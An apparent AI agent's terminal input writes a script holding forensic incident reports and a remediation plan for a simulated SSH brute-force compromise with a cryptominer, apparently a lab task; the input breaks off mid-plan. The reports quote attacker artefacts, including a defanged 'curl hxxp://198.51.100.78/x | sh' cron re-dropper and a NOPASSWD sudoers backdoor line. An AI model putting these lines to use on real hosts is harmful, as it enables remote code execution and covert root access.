Sending keys: ['cat << \'EOF\' > /app/gen_all.py\nimport os\n\nintrusion_report = \'\'\'# Post-Compromise Forensic Intrusion Report\n\n## Executive Summary\nHost `ssh-prod-01` (CentOS 7 Linux) suffered a multi-stage compromise initiated via external SSH root credential brute-forcing. The attacker successfully authenticated as `root`, deployed an XMRig Monero cryptominer, established multi-layered persistence across four distinct mechanisms (cron, systemd service, shell init, and a sudoers backdoor), cleared system authentication logs to evade detection, and conducted internal reconnaissance/pivoting via `hydra` against internal targets.\n\n## Attacker Entities and Indicators of Compromise (IoCs)\n- **Origin Attacker IP:** `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`)\n- **C2 Beacon Domain:** `update-ssh.example.cn` (`/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`)\n- **Cryptomining Pool:** `stratum+tcp://xmr.ssh.evil:3333` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)\n- **Monero Wallet Address:** `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)\n- **Malware Process PID:** `1337` (`/disk/tmp/.X11-unix/.xorg`)\n- **Malware Binary Location:** `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`)\n- **Malware Binary SHA256 Hash:** `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253` (`/disk/tmp/.X11-unix/.xorg`)\n\n## Comprehensive Attack Chain Analysis\n\n### 1. Initial Access & Credential Access\nThe attacker initiated a high-frequency SSH password brute-force campaign against host `ssh-prod-01` targeting common accounts (`oracle`, `test`, `admin`, `postgres`, `root`) from source IP `198.51.100.78` (`/disk/var/log/secure:141`). At 2026-08-15 00:54:55 UTC, the attacker successfully authenticated as user `root` due to weak root credentials and permissive SSH baseline configurations (`/disk/var/log/secure:178`, `/disk/etc/ssh/sshd_config`).\n\n### 2. Execution & Impact (Cryptomining)\nUpon gaining root access, the attacker dropped and executed an XMRig cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`). The process ran under PID 1337, connecting to Monero mining pool `stratum+tcp://xmr.ssh.evil:3333` using wallet `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).\n\n### 3. Persistence Mechanisms (Alerted vs. Silent/Unalerted)\nThe attacker established four separate persistence mechanisms across the system:\n1. **Cron Persistence (Alerted CHK-11):** A cron entry in `/var/spool/cron/root` scheduled a recurring curl payload `curl hxxp://198.51.100.78/x | sh` to re-drop malware (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).\n2. **Systemd Service Persistence (Alerted CHK-13):** A malicious systemd unit file was placed at `/etc/systemd/system/system-update-helper.service` to auto-start a miner re-dropper on boot (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).\n3. **Shell Initialization Persistence (SILENT / Unalerted):** A `PROMPT_COMMAND` beacon pointing to `198.51.100.78` was injected into `/root/.bashrc` to execute whenever an interactive root shell is opened (`/disk/root/.bashrc:2`).\n4. **Privilege Escalation Sudo Backdoor (SILENT / Unalerted):** A drop-in sudoers file was created at `/etc/sudoers.d/devops` granting user `devops` unrestricted root privileges via `devops ALL=(ALL) NOPASSWD: ALL` (`/disk/etc/sudoers.d/devops:3`).\n\n### 4. Defense Evasion (Log Wiping)\nTo cover their tracks, the attacker wiped system authentication logs, creating an anti-forensic gap in `/var/log/secure` between 00:54:55 UTC and 01:29:12 UTC (`/disk/var/log/secure:178`). Residue of the wiping utility and domain C2 beacon were recovered from `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin`).\n\n### 5. Lateral Movement & Internal Pivoting\nFrom the compromised foothold, the attacker utilized the `devops` user account context to run `hydra` SSH brute-force attacks against internal network targets, as evidenced by shell history residue (`/disk/home/devops/.bash_history:6`).\n\n## MITRE ATT&CK Technique Mapping\n\n| ATT&CK ID | Technique Name | Description | Evidence Citation | Alert Status |\n|---|---|---|---|---|\n| T1110 | Brute Force | Password brute-force attack on SSH root account | `/disk/var/log/secure:178` | Unalerted |\n| T1021.004 | SSH | Successful SSH remote access login | `/disk/var/log/secure:178` | Unalerted |\n| T1059.004 | Unix Shell | Execution of shell commands and scripts | `/disk/root/.bashrc:2` | Unalerted |\n| T1496 | Resource Hijacking | Monero cryptomining process and binary | `/disk/tmp/.X11-unix/.xorg` | Alerted (CHK-01/02) |\n| T1053.003 | Cron | Recurring scheduled re-dropper script | `/disk/var/spool/cron/root:5` | Alerted (CHK-11) |\n| T1546.004 | Unix Shell Config Modification | PROMPT_COMMAND beacon in `.bashrc` | `/disk/root/.bashrc:2` | Silent / Unalerted |\n| T1543.002 | Systemd Service | Malicious service `system-update-helper.service` | `/disk/etc/systemd/system/system-update-helper.service` | Alerted (CHK-13) |\n| T1070.002 | Clear Linux or Mac System Logs | Truncation and wiping of `/var/log/secure` | `/disk/var/lib/.cache/.wiped.bin` | Silent / Unalerted |\n| T1548.003 | Sudo and Sudo Caching | NOPASSWD sudoers backdoor for `devops` | `/disk/etc/sudoers.d/devops:3` | Silent / Unalerted |\n\'\'\'\n\nvuln_report = \'\'\'# Vulnerability-Driven Entry Analysis Report\n\n## Executive Summary\nA comprehensive analysis of vulnerability scan data (`/sas/vulns.json`), threat intelligence advisories (`/sas/cti/advisory.txt`), and forensic disk artifacts (`/disk`) was conducted to evaluate whether software vulnerabilities (CVEs) played any role in the initial compromise of `ssh-prod-01`.\n\n## Evaluation of Vulnerability Scan Results\nThe machine-readable vulnerability scan feed `/sas/vulns.json` contains an empty list (`[]`), indicating that no unpatched software vulnerabilities or active CVE exploits were identified or reported on host `ssh-prod-01` (`/sas/vulns.json`).\n\n## Evaluation of Draft Change Ticket Claims (BlueKeep CVE-2019-0708)\nThe initial draft change ticket CHG-3182 proposed patching `CVE-2019-0708` (BlueKeep) on RDP (`/sas/handoff/change-ticket.md`). \n\nThis proposal is **FALSE and INCORRECT**:\n1. Host `ssh-prod-01` is running CentOS 7 Linux (`/disk/etc/os-release`), whereas BlueKeep (CVE-2019-0708) is a Remote Desktop Protocol (RDP) vulnerability specific to Microsoft Windows operating systems (`/sas/cti/advisory.txt`).\n2. No RDP service or Windows subsystem exists on this Linux host (`/disk/etc/os-release`).\n\n## True Initial Entry Vector Identification\nInitial access was achieved purely through **credential exploitation** (SSH root password brute forcing) rather than software vulnerability exploitation:\n- Source IP `198.51.100.78` performed rapid password attempts against port 22 (`/disk/var/log/secure:141`).\n- Successful root login occurred at 2026-08-15 00:54:55 UTC via `Accepted password for root` (`/disk/var/log/secure:178`).\n- Threat intelligence advisory confirms the campaign relies on brute-force SSH logins (`/sas/cti/advisory.txt`).\n\n## Conclusion\n- **Software Vulnerability Exploited for Entry:** NONE (0 CVEs).\n- **Primary Root Cause:** Weak root password and non-hardened SSH service configurations.\n- **Confidence Level:** HIGH (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`, `/sas/vulns.json`).\n\'\'\'\n\nbaseline_report = \'\'\'# Security Baseline and Configuration Analysis Report\n\n## Executive Summary\nAnalysis of system configurations on `ssh-prod-01` revealed several severe security baseline deficiencies that directly facilitated the initial breach, enabled privilege escalation, and increased the host\'s overall attack surface.\n\n## Baseline Findings & Weaknesses\n\n### 1. Insecure SSH Configuration (BAS-01 / CHK-04)\n- **Artifact Path:** `/etc/ssh/sshd_config` (`/disk/etc/ssh/sshd_config`, `/sas/baseline.json`)\n- **Identified Weaknesses:**\n  - `PermitRootLogin yes`: Allows direct SSH logins as `root` from remote external hosts (`/disk/etc/ssh/sshd_config`).\n  - `PasswordAuthentication yes`: Permits password authentication instead of requiring SSH key-based authentication (`/disk/etc/ssh/sshd_config`).\n  - `MaxAuthTries 6`: High authentication attempt threshold before disconnection, enabling rapid dictionary brute-forcing (`/disk/etc/ssh/sshd_config`).\n- **Security Risk:** Allowed the external attacker at `198.51.100.78` to brute-force the root user password directly over the network (`/disk/var/log/secure:178`).\n\n### 2. MySQL Remote Root Access and Public Binding (BAS-02 / CHK-09)\n- **Artifact Path:** `/etc/my.cnf` (`/disk/etc/my.cnf`, `/sas/baseline.json`)\n- **Identified Weaknesses:**\n  - `bind-address = 0.0.0.0`: Binds MySQL database service to all network interfaces (`/disk/etc/my.cnf`).\n  - Remote root grant enabled: Grants root database privileges over remote network connections (`/disk/etc/my.cnf`).\n- **Security Risk:** Exposes sensitive database management interface directly to the public/untrusted network.\n\n### 3. Weak Root Account Password Policy\n- **Artifact Path:** System authentication logs (`/disk/var/log/secure:178`)\n- **Identified Weaknesses:** Root account was secured by a weak password easily guessable via standard dictionary attack tools (`hydra`).\n- **Security Risk:** Enabled root account takeover within minutes of attack onset (`/disk/var/log/secure:141-178`).\n\n### 4. Excessive Privilege Delegation in Sudoers (Silent Backdoor Risk)\n- **Artifact Path:** `/etc/sudoers.d/devops` (`/disk/etc/sudoers.d/devops:3`)\n- **Identified Weaknesses:** Drop-in sudoers entry `devops ALL=(ALL) NOPASSWD: ALL` grants unrestricted root access without password prompt (`/disk/etc/sudoers.d/devops:3`).\n- **Security Risk:** Created a persistent backdoor allowing user `devops` to elevate to root seamlessly (`/disk/etc/sudoers.d/devops:3`).\n\'\'\'\n\nremediation_plan = \'\'\'# Comprehensive Post-Incident Remediation & Containment Plan\n\n## Executive Summary\nThis remediation plan outlines prioritized, step-by-step procedures to contain the active breach on `ssh-prod-01`, eradicate all persistence mechanisms, harden host baselines, and reconcile the draft change ticket CHG-3182. In accordance with forensic best practices, all actions prioritize backup and quarantine over destructive deletion.\n\n---\n\n## Reconciled Change Ticket CHG-3182\n\nBelow is the updated and corrected change ticket reconciled against forensic evidence in `/disk` and `/sas`:\n\n| # | Action | Target | Status | Note / Rationale & Evidence |\n|---|--------|--------|--------|-----------------------------|\n| 1 | Block source IP inbound | `198.51.100.78` | PROPOSED | **RECONCILED**: Corrected attacker IP from stale `203.0.113.9` to `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`). |\n| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | REJECTED | **RECONCILED**: Rejected BlueKeep patch claim. Host is CentOS Linux; entry was SSH brute force (`/disk/etc/os-release`, `/sas/cti/advisory.txt`). |\n| 3 | Remove cron miner | `/var/spool/cron/root` | OPEN | **RECONCILED**: Downgraded from DONE to OPEN. Cron persistent beacon on line 5 requires quarantine and removal (`/disk/var/spool/cron/root:5`). |\n| 4 | Remove shell-init persistence | `/root/.bashrc` | TODO | **ADDED**: Quarantine and remove `PROMPT_COMMAND` beacon on line 2 (`/disk/root/.bashrc:2`). |\n| 5 | Remove systemd persistence | `/etc/systemd/system/system-update-helper.service` | TODO | **ADDED**: Disable, stop, and quarantine helper service (`/disk/etc/systemd/system/system-update-helper.service`). |\n| 6 | Remove sudoers backdoor | `/etc/sudoers.d/devops` | TODO | **ADDED**: Remove NOPASSWD ALL backdoor entry (`/disk/etc/sudoers.d/devops:3`). |\n| 7 | Kill miner process & quarantine binary | `/tmp/.X11-unix/.xorg` | TODO | **ADDED**: Terminate process PID 1337 and quarantine binary sample (`/disk/tmp/.X11-unix/.xorg`). |\n| 8 | Harden SSH configuration | `/etc/ssh/sshd_config` | TODO | **ADDED**: Set `PermitRootLogin no`, `PasswordAuthentication no`, require keys (`/disk/etc/ssh/sshd_config`). |\n| 9 | Harden MySQL configuration | `/etc/my.cnf` | TODO | **ADDED**: Set `bind-address = 127.0.0.1` and disable remote root (`/disk/etc/my.cnf`). |\n| 10 | Rotate root & user credentials | System Accounts | TODO | **ADDED**: Force password rotation across root and user accounts (`/disk/etc/passwd`). |\n\n---\n\n## Phase 1: Immediate Network Containment & Process Termination\n\n### Step 1.1: Block Attacker Infrastructure at Perimeter Firewall\n- **Action:** Add drop rules for attacker origin IP `198.51.100.78`, C2 domain `update-ssh.example.cn`, and pool domain `xmr.ssh.evil`.\n- **Evidence Citation:** `/disk/var/log/secure:178`, `/sas/cti/advisory.txt`\n- **Verification Command:** `iptables -L -n -v | grep 198.51.100.78`  \n\n### Step 1.2: Terminate Mining Process & Quarantine Binary\n- **Action:** Terminate active miner process (PID 1337) and move binary `/tmp/.X11-unix/.xorg` to quarantine directory `/var/quarantine/`.\n- **Evidence Citation:** `/disk/tmp/.X11-unix/.xorg`  \n- **Commands:**\n  ```bash\n  mkdir -p /var/quarantine\n  kill -9 1337\n  mv /tmp/.X11-unix/.xorg /var/quarantine/.xorg.bak\n  chmod 000 /var/quarantine/.xorg.bak\n  ```\n- **Verification Command:** `ps aux | grep .xorg`  \n\n---\n\n## Phase 2: Eradication of Persistence Mechanisms\n\n### Step 2.1: Eradicate Cron Persistence\n- **Action:** Backup `/var/spool/cron/root` to `/var/quarantine/cron_root.bak` and remove line 5 containing the malicious beacon.\n- **Evidence Citation:** `/disk/var/spool/cron/root:5`  \n- **Commands:**\n  ```bash\n  cp /var/spool/cron/root /var/quarantine/cron_root.bak\n  sed -i \'/198.51.100.78/d\' /var/spool/cron/root\n  ```\n- **Verification Command:** `crontab -l -u root | grep 198.51.100.78`  \n\n##